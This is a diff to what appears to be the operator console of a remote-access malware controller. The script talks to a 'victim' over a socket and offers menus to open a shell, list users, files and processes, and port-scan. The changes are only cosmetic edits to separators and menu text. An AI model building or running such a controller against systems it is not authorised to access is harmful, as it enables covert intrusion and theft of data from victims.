@@ -122,11 +122,11 @@ malware_os = s.recv(4096).decode('utf-8')
 getinfo = GetInfo(malware_os)
 shell = Shell()
 
-print("----------------------")
+print("----------------")
 message = input(
-    "1. Press 1 to start a Shell\n2. Press 2 to retrieve information of the victim\n3. Press 3 to start the "
-    "PortScanner.\n4. Type exit to quit\n\nAnswer: ")
-print("\n----------------------")
+    "1. Press 1 to start a Shell\n2. Press 2 to retrieve information of the victim\n3. Press 3 to start a "
+    "Port Scanner.\n4. Type exit to quit\n\nAnswer: ")
+print("\n----------------------------------------")
 
 while message != "exit":
     if message == "1":
@@ -147,12 +147,12 @@ while message != "exit":
         shell.set_command(getinfo.get_users())
         shell.send()
         shell.receive()
-        print("----------------------")
+        print("----------------------------------------")
         print("[*] Directory Content")
         shell.set_command(getinfo.get_content())
         shell.send()
         shell.receive()
-        print("----------------------")
+        print("----------------------------------------")
         print("[*] list Running Process")
         shell.set_command(getinfo.list_process())
         shell.send()
@@ -163,10 +163,9 @@ while message != "exit":
         scan = PortScanner()
         scan.scanner()
 
-    print("\n----------------------")
+    print("\n----------------------------------------")
     message = input(
-        "1. Press 1 to start a Shell\n2. Press 2 to retrieve information of the victim\n3. Press 3 to start the "
-        "PortScanner.\n4. Type exit to quit\n\nAnswer: ")
-print("\n----------------------")
+        "1. Press 1 to start a Shell\n2. Press 2 to retrieve information of the victim\n3. Press 3 to start a "
+        "Port Scanner.\n4. Type exit to quit\n\nAnswer: ")
 
 s.close()
